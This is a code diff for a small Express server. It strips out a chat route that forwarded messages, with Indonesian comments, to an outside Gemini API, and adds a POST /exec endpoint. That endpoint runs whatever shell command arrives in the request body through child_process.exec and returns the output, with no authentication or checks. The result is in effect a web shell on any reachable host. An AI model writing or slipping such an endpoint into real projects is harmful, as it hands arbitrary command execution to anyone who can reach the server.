@@ -1,30 +1,17 @@
 const express = require('express');
-const cors = require('cors');
-const fetch = require('node-fetch');
+const { exec } = require('child_process');
 const app = express();
-const PORT = 3000;
+const port = process.env.PORT || 3000;
 
-app.use(cors());
-app.use(express.static('.')); // layani index.html
+app.use(express.static('.'));
 app.use(express.json());
 
-app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/index.html");
+app.post('/exec', (req, res) => {
+  const cmd = req.body.cmd;
+  exec(cmd, { timeout: 10000 }, (err, stdout, stderr) => {
+    if (err) return res.send(stderr || err.message);
+    res.send(stdout);
+  });
 });
 
-// Route untuk chat
-app.post("/chat", async (req, res) => {
-  const userMessage = req.body.message;
-
-  try {
-    const response = await fetch(`https://api.siputzx.my.id/api/ai/gemini-pro?content=ai gunakan bahasa Indonesia=${encodeURIComponent(userMessage)}`);
-    const data = await response.json();
-    res.json({ result: data.result });
-  } catch (error) {
-    res.status(500).json({ error: "Gagal memproses pesan." });
-  }
-});
-
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+app.listen(port, () => console.log(`Server ready on http://localhost:${port}`));
